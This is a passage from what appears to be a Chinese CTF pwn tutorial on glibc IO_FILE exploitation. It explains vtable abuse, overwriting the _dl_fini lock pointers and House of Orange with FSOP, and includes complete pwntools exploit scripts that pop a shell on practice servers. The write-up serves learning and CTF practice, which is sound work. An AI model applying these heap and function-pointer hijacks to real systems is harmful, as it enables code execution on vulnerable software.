  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

利用函数 `_IO_wstr_overflow`：

```c
_IO_wint_t
_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)
{
  int flush_only = c == WEOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : WEOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_wide_data->_IO_write_ptr = fp->_wide_data->_IO_read_ptr;
      fp->_wide_data->_IO_read_ptr = fp->_wide_data->_IO_read_end;
    }
  pos = fp->_wide_data->_IO_write_ptr - fp->_wide_data->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_wblen (fp) + flush_only))    // 条件 #define _IO_wblen(fp) ((fp)->_wide_data->_IO_buf_end - (fp)->_wide_data->_IO_buf_base)
    {
      if (fp->_flags2 & _IO_FLAGS2_USER_WBUF) /* not allowed to enlarge */
    return WEOF;
      else
    {
      wchar_t *new_buf;
      wchar_t *old_buf = fp->_wide_data->_IO_buf_base;
      size_t old_wblen = _IO_wblen (fp);
      _IO_size_t new_size = 2 * old_wblen + 100;              // 使 new_size * sizeof(wchar_t) 为 "/bin/sh" 的地址

      if (__glibc_unlikely (new_size < old_wblen)
          || __glibc_unlikely (new_size > SIZE_MAX / sizeof (wchar_t)))
        return EOF;

      new_buf
        = (wchar_t *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size
                                    * sizeof (wchar_t));                      // 在这个相对地址放上 system 的地址
    [...]
```

利用函数 `_IO_wstr_finish`：

```c
void
_IO_wstr_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_wide_data->_IO_buf_base && !(fp->_flags2 & _IO_FLAGS2_USER_WBUF))    // 条件
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_wide_data->_IO_buf_base);     // 在这个相对地址放上 system 的地址
  fp->_wide_data->_IO_buf_base = NULL;

  _IO_wdefault_finish (fp, 0);
}
```

### 修改 _dl_fini 函数指针

以 hctf2018_the_end 为例子，题目部署在 Ubuntu 18，远程实验到 buu 。

> 这条题目在 Ubuntu 18 下有 vtable 检查，修改 vtable 方法失效。
>
> 下面调试过程中寻找 libc 与 ld 偏移时与 buu 靶机情况不一样，因为我们本地在 docker 改 libc 运行 ld 和 libc 位置变化了，具体看后文

exit() 函数的利用链：

![exit()](https://gitee.com/mrskye/Picbed/raw/master/img/20201212231817.png)

在 exit 函数中会调用 ``__run_exit_handlers()`` ：

```c
//glibc/stdlib/exit.c
……
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
……
```

__run_exit_handlers() 调用 _dl_fini ：

![image-20201212231929231](https://gitee.com/mrskye/Picbed/raw/master/img/20201212231929.png)

在 \_dl_fini 函数中调用调用函数 ``__rtld_lock_lock_recursive()`` 和 ``__rtld_lock_unlock_recursive()``：

```c
//glibc/elf/dl-fini.c
...
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));
      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
         auditing DSOs.  */
      if (nloaded == 0
#ifdef SHARED
          || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
          )
        __rtld_lock_unlock_recursive (GL(dl_load_lock));
      else
        {
...
```

 ``__rtld_lock_lock_recursive``、`` __rtld_lock_unlock_recursive``是通过宏定义来的：

```c
//glibc/sysdeps/nptl/libc-lockP.h
# define __rtld_lock_lock_recursive(NAME) \
  GL(dl_rtld_lock_recursive) (&(NAME).mutex)
# define __rtld_lock_unlock_recursive(NAME) \
  GL(dl_rtld_unlock_recursive) (&(NAME).mutex)
```

从上面定义知道真正函数是 GL 宏中的 ``dl_rtld_lock_recursive`` ，查看宏 GL 定义：

```c
//Rtld.c
extern struct rtld_global _rtld_local
    __attribute__ ((alias ("_rtld_global"), visibility ("hidden")));

//Ldsodefs.h
extern struct rtld_global _rtld_local __rtld_local_attribute__;
#  undef __rtld_local_attribute__
# endif
extern struct rtld_global _rtld_global __rtld_global_attribute__;
# undef __rtld_global_attribute__

//Db_info.c
typedef struct rtld_global rtld_global;

//elf/Rtld.c
struct rtld_global _rtld_global =
  {
    /* Generally the default presumption without further information is an
     * executable stack but this is not true for all platforms.  */
    ._dl_stack_flags = DEFAULT_STACK_PERMS,
#ifdef _LIBC_REENTRANT
    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,
    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,
#endif
    ._dl_nns = 1,
    ._dl_ns =
    {
#ifdef _LIBC_REENTRANT
      [LM_ID_BASE] = { ._ns_unique_sym_table
		       = { .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER } }
#endif
    }
  };
  
//Ldsodefs.h
#ifndef SHARED
# define EXTERN extern
# define GL(name) _##name
#else
# define EXTERN
# if IS_IN (rtld)
#  define GL(name) _rtld_local._##name
# else
#  define GL(name) _rtld_global._##name
# endif
```

有点复杂，这里简化描述一下：从 40-45 知道 GL 是 _rtld_local 或 _rtld_global 类型的结构体；两种结构体定义看上面代码前面部分。所以 GL(dl_rtld_lock_recursive) 是 _rtld_global 结构体内的 dl_rtld_lock_recursive 指针。

有点绕，先整理下 _dl_fini 调用的实际是什么：

```
_dl_fini 调用 __rtld_lock_lock_recursive
__rtld_lock_lock_recursive 宏定义为 GL(dl_rtld_lock_recursive)
GL 是一个 _rtld_global 结构体
dl_rtld_lock_recursive 是 _rtld_global 结构体的一个指针
```

**_dl_fini 实际调用 _rtld_global 结构体的 _dl_rtld_lock_recursive 指针。**

在 gdb 中查看 _rtld_global 信息：

```shell
p _rtld_global#查看结构体内容
p *_rtld_global#查看结构体地址
```

在结构体里面找到了实际的调用的函数指针：

![image-20201212010538691](https://gitee.com/mrskye/Picbed/raw/master/img/20201212010538.png)

**_rtld_global 是在 ld.so 内存段**里面的，泄露 libc 可以通过偏移计算出 ld 基地址，按照图中偏移应该为 ``offset=0x7f30c73af000-0x7f30c6df8000=0x5b7000``：

![image-20201212010329020](https://gitee.com/mrskye/Picbed/raw/master/img/20201212010329.png)

由于我这里调试时改 libc 和 ld 所以计算出来的偏移 0x5b7000 并不是远程环境（原生18.04运行）下的偏移，在 Ubuntu 18.04 下重新调试计算得出偏移为 ``0x3f1000`` ，这个偏移与 buu 上的环境一样：

![image-20201212164833238](https://gitee.com/mrskye/Picbed/raw/master/img/20201212164833.png)

计算出 \_rtld\_global 的地址通过偏移得到 \_dl\_rtld_lock_recursive 、\_dl\_rtld_unlock_recursive 地址。这个偏移我是 gdb 查看 _rtld_global 地址，不断加偏移找：

```c
_dl_rtld_lock_lock_recursive -> 0xf00
_dl_rtld_lock_unlock_recursive -> 0xf08
```

![image-20201212165906952](https://gitee.com/mrskye/Picbed/raw/master/img/20201212165907.png)

两个函数都会调用，将其指针改成 onegadget ，最后尝试 _dl_rtld_unlock_recursive 才满足 onegadget 条件。

**EXP** 如下：

```python
#remote:ubuntu18.04
from pwn import *
context(log_level='debug',arch='amd64',os='linux',
	terminal=['tmux','sp','-h'])

#p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./the_end"], env={"LD_PRELOAD":"/glibc/2.27/64/lib/libc-2.27.so"})
#libc = ELF("/glibc/2.27/64/lib/libc-2.27.so")
#ld = ELF("/glibc/2.27/64/lib/ld-2.27.so")
# p = process("./the_end")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# ld = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")
p = remote("node3.buuoj.cn",27518)
libc = ELF("./libc-2.27.so")
ld = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")
elf = ELF("./the_end")

offset_ldbase_of_libcbase = 0x3f1000#0x5b7000
offset_dl_rtld_lock_recursive_of_rtld_global = 0xf00
offset_dl_rtld_unlock_recursive_of_rtld_global = 0xf08

p.recvuntil("gift ")
sleep_addr = int(p.recv(14),16)
log.info("sleep_addr:"+hex(sleep_addr))
libc_base = sleep_addr-libc.sym['sleep']
log.info("libc_base:"+hex(libc_base))

ld_base = libc_base+offset_ldbase_of_libcbase
log.info("ld_base:"+hex(ld_base))
rtld_global = ld_base+ld.sym['_rtld_global']
log.info("rtld_global:"+hex(rtld_global))
dl_rtld_lock_recursive = rtld_global+offset_dl_rtld_lock_recursive_of_rtld_global
log.info("dl_rtld_lock_recursive:"+hex(dl_rtld_lock_recursive))
dl_rtld_unlock_recursive = rtld_global+offset_dl_rtld_unlock_recursive_of_rtld_global
log.info("dl_rtld_unlock_recursive_of_rtld_global:"+hex(dl_rtld_unlock_recursive))

onegadget = libc_base+0x4f322

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

#gdb.attach(p,"b *$rebase(0x964)")

for i in range(5):
	#p.send(p64(dl_rtld_lock_recursive+i))
	p.send(p64(dl_rtld_unlock_recursive+i))
	p.send(p64(onegadget)[i])

p.sendline("exec 1>&0")

p.interactive()
```



## House of orange

### 概述

house of orange 特殊之处是题目没有 free 函数等释放堆块函数。house of orange 核心思想通过漏洞实现 free 的效果。

### 使用条件

* 能控制 topchunk size 位（堆溢出等）
* 能控制堆分配的大小

### 原理

当 topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，实现没有 free 函数释放堆块。

扩展堆空间有 ``mmap`` 和 ``brk`` 两种方式，我们需要以 ``brk`` 拓展，需要绕过 libc 一些 check ：**malloc 申请大小不能大于 ``mmp_.mmap_threshold``**

```c
if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))
```

总结伪造 topchunk 要求：

* 伪造 size 需要对齐内存页

  比如现在 topchunk size 为：``0x20fa1``，那么对齐内存页的 size 可以为：0xfa1、0x1fa1……

* size 要大于 MINSIZE

* prev_inuse 为 1

* size 要小于等等申请 chunk_size+MINISIZE （才能让 topchunk 放入 unsortedbin）

自此得到一个 unsortedbin 堆，用来泄露 libc 地址，实现 FSOP

### hitcon_2016_houseoforange

#### 基本情况

保护全开，实验环境在 Ubuntu16.04。

能自主控制分配堆大小，结构体如下：

```c
struct{
  *info;
  chunk_ptr;
}
struct info{
  price;
  color;
}
```

在 edit 函数中存在堆溢出：

![image-20201216230021762](https://gitee.com/mrskye/Picbed/raw/master/img/20201216230021.png)

#### 思路

利用堆溢出将 topchunk size 改小，size 要求看前文。修改前 topchunk 和 heap 范围：

![image-20201216231726321](../../../../../Library/Application Support/typora-user-images/image-20201216231726321.png)

修改后情况：

![image-20201216231929179](https://gitee.com/mrskye/Picbed/raw/master/img/20201216231929.png)

之后申请一个大于 topchunk 的堆，topchunk 就被放入 unsortedbin ：

```shell
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0
```

申请一个 largebin 用于泄露 libc 和 堆地址。用的 malloc 分配，libc 读取 bk 位置信息即可，分配的是 largebin 在 fd_nextsize 和 bk_nextsize 都存放堆地址分别读出即可。堆地址在 FSOP 伪造 vtable 需要用到。

自此后面就是 FSOP 利用。劫持在 libc 中的 \_IO\_list\_all 内容，将其内容指向可控地址伪造 \_IO\_FILE_plus 和 vtabel 。默认状态下的 \_IO_list_all 指向的是 \_IO\_2\_1\_stderr\_ ：

![image-20201216232610931](https://gitee.com/mrskye/Picbed/raw/master/img/20201216232611.png)

利用堆溢出修改在 unsortedbin 的 topchunk fd bk 指针，发起 unsortedbin attack 劫持 \_IO_list_all 。这里修改完 fd bk 之后申请一个堆，topchunk unlink 就会修改 \_IO_list_all 指向到 main_arena+88 ，这个区域前后我们还是不能控制，就利用 _chain 标志位指向下一个文件流，这个标志位的位置刚好是 unsortedbin 0x60 链表位置。因此将 topchunk size 覆盖为 0x60 ：

![image-20201216234838174](https://gitee.com/mrskye/Picbed/raw/master/img/20201216234838.png)

执行 \_IO_flush_all_lockp 时逐个遍历文件流，遇到错误文件就跳过去处理 _chain 指向的下一个文件流，因此现在 topchunk 里面伪造一个 \_IO\_FILE\_plus 结构体。

需要设置几个标志位绕过保护：

```c
mode_offset=0x0;
writeptr_offset=0x1;
writebase_offset=0x0;
```
然后将 vtable 指针劫持会 topchunk 特定位置，让 __overflow 为 system ，文件流（topchunk）头部覆盖为 /bin/sh 作为参数传入。

成功结构体如下：

![image-20201217000607071](https://gitee.com/mrskye/Picbed/raw/master/img/20201217000607.png)

![image-20201217000644542](https://gitee.com/mrskye/Picbed/raw/master/img/20201217000644.png)

#### EXP

```python
from pwn import *
context(log_level='debug',arch='amd64')

# p = process("./houseoforange_hitcon_2016")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = remote("node3.buuoj.cn",29595)
libc = ELF("./libc-2.23.so")
elf = ELF("./houseoforange_hitcon_2016")

def command(id):
	p.recvuntil(": ")
	p.sendline(str(id))

def add(size, content, price, color):
	command(1)
	p.recvuntil("Length of name :")
	p.sendline(str(size))
	p.recvuntil("Name :")
	p.send(content)
	p.recvuntil("Price of Orange:")
	p.sendline(str(price))
	p.recvuntil("Color of Orange:")	
	p.sendline(str(color))

def show():
	command(2)

def edit(size, content, price, color):
	command(3)
	p.recvuntil("Length of name :")
	p.sendline(str(size))
	p.recvuntil("Name:")
	p.send(content)
	p.recvuntil("Price of Orange:")
	p.sendline(str(price))
	p.recvuntil("Color of Orange:")
	p.sendline(str(color))

# step1 'free' 2 bin
add(0x18,'a'*8,0xddaa,0xddaa)
payload='a'*0x38+p64(0xfa1)
edit(len(payload),payload,0xddaa,0xddaa)
add(0x1000,'b'*8,0xddaa,0xddaa)
#0x555555758000     0x555555779000 rw-p    21000 0      [heap]
#0x555555758000     0x55555579b000 rw-p    43000 0      [heap]

# step2 leak libc
add(0x450,'c'*8,0xddaa,0xddaa)
show()
p.recvuntil('c'*8)
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("leak_addr:"+hex(leak_addr))
libc_addr = leak_addr-1640-0x3c4b20
log.info("libc_addr:"+hex(libc_addr))
IO_list_all=libc_addr+libc.sym['_IO_list_all']
log.info("IO_list_all:"+hex(IO_list_all))
system=libc_addr+libc.sym['system']

# step3 leak heap
payload = 'd' * 0x10
edit(0x10, payload,0xddaa,0xddaa)
show()
p.recvuntil('d'*0x10)
heap_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("heap_addr:"+hex(heap_addr))

# set fake struct
payload='d'*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)
fake = '/bin/sh\x00'+p64(0x61)
fake += p64(0)+p64(IO_list_all-0x10)
fake += p64(0) + p64(1)
fake = fake.ljust(0xc0,'\x00')
fake += p64(0) * 3
fake += p64(heap_addr+0x558) #vtable
fake += p64(0) * 2
fake += p64(system)
payload += fake
edit(len(payload),payload,2,3)

#gdb.attach(p)

# unlink attack
p.recvuntil("Your choice : ")
p.sendline('1')

p.interactive()
```

#### 参考文章

* [ctf-HITCON-2016-houseoforange学习](https://www.cnblogs.com/shangye/p/6268981.html)
* [houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）](https://blog.csdn.net/weixin_44145820/article/details/105270036)
* [house_of_orange](https://www.jianshu.com/p/1e45b785efc1)

## 参考文章

* [IO_FILE:2018 HCTF the_end](https://blog.csdn.net/Mira_Hu/article/details/103736917)
* [4.13 利用 _IO_FILE 结构](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.13_io_file.html)
* [IO_FILE Related](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file)
* [IO file结构在pwn中的妙用](https://xz.aliyun.com/t/6567)
* [IO_FILE Pwn 利用整理](https://bestwing.me/IO_FILE_Pwn.html)



---

[^1]: 用 fwrite 等这种流 I/O 函数写入写出，数据会先放在缓冲区，并没有真正输入或者输出，需要用 fflush 冲洗流中信息才完成写入写出。避免用 fflush 冲洗就用 setbuf 函数关闭缓冲（pwn 题初始化必备）

